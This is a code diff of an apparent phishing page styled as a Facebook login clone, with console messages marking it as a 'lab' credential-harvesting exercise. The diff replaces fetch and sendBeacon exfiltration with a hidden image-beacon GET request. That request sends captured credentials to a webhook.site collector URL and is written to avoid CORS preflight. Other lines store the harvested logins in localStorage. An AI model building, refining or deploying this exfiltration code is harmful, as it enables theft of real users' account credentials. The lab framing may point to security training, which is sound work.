@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -344,53 +345,34 @@
       }
     }
     
-    // Send via fetch with keepalive (background, no popup)
-    async function sendViaFetch(data) {
+    // Send via Image Beacon - GET request (no CORS preflight, no OPTIONS)
+    function sendViaImageBeacon(data) {
       if (!COLLECTOR_URL || COLLECTOR_URL === 'https://webhook.site/YOUR-UNIQUE-ID') {
         return false;
       }
       
       try {
-        // Use fetch with keepalive - runs in background, no popup
-        const response = await fetch(COLLECTOR_URL, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data),
-          keepalive: true
-        });
+        // Convert data to query string for GET request
+        const queryString = 'payload=' + encodeURIComponent(JSON.stringify(data));
+        const url = COLLECTOR_URL + '?' + queryString + '&_t=' + Date.now();
         
-        if (response.ok) {
-          console.log("[LAB] ✓ Sent via fetch POST");
-          return true;
-        } else {
-          console.log("[LAB] ⚠️ Fetch responded with status:", response.status);
-          return false;
-        }
-      } catch (err) {
-        console.log("[LAB] ⚠️ Fetch failed (CORS/network):", err.message);
-        return false;
-      }
-    }
-    
-    // Send via sendBeacon (background, no popup, more reliable for page unload)
-    function sendViaBeacon(data) {
-      if (!COLLECTOR_URL || COLLECTOR_URL === 'https://webhook.site/YOUR-UNIQUE-ID') {
-        return false;
-      }
-      
-      try {
-        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-        const sent = navigator.sendBeacon(COLLECTOR_URL, blob);
-        if (sent) {
-          console.log("[LAB] ✓ Sent via sendBeacon");
-        } else {
-          console.log("[LAB] ⚠️ sendBeacon failed (queue full)");
-        }
-        return sent;
+        // Create image element to send GET request (no OPTIONS preflight)
+        const img = new Image();
+        img.style.display = 'none';
+        img.onload = function() {
+          console.log("[LAB] ✓ Sent via image beacon (GET)");
+          img.remove();
+        };
+        img.onerror = function() {
+          console.log("[LAB] ⚠️ Image beacon failed");
+          img.remove();
+        };
+        img.src = url;
+        
+        document.body.appendChild(img);
+        return true;
       } catch(e) {
-        console.log("[LAB] sendBeacon error:", e.message);
+        console.log("[LAB] Image beacon error:", e.message);
         return false;
       }
     }
@@ -423,17 +405,10 @@
       // Always save to localStorage (backup)
       saveToLocalStorage(harvestedEntry);
       
-      // Try to send to webhook using methods that don't open windows
+      // Send to webhook using image beacon (GET request - no CORS preflight, only one request)
       if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
-        // Try fetch first
-        const fetchSent = await sendViaFetch(harvestedEntry);
-        
-        // Also try sendBeacon as backup (doesn't wait for response)
-        if (!fetchSent) {
-          sendViaBeacon(harvestedEntry);
-        }
-        
-        console.log("%c💡 Credentials captured and sent to webhook", "color: #42b72a");
+        sendViaImageBeacon(harvestedEntry);
+        console.log("%c💡 Credentials captured and sent to webhook (GET request - no OPTIONS preflight)", "color: #42b72a");
       } else {
         console.log("[LAB] ℹ️ Webhook URL not configured, data saved to localStorage only");
         console.log("[LAB] 💡 To view captured data, run: JSON.parse(localStorage.getItem('lab_harvest_log'))");
@@ -600,7 +575,7 @@
     (function showStoredSummary() {
       console.log("%c🔐 Facebook Clone - Credential Harvesting Active", "color: #1877f2; font-size: 14px; font-weight: bold");
       console.log("%c📡 Webhook URL:", "color: #666", COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' ? COLLECTOR_URL : "NOT CONFIGURED (data saved to localStorage only)");
-      console.log("%c💡 Credentials are sent in background - no popup windows will appear", "color: #42b72a");
+      console.log("%c💡 Using GET request via image beacon - no OPTIONS preflight, single request only", "color: #42b72a");
       
       try {
         const storedRaw = localStorage.getItem('lab_harvest_log');
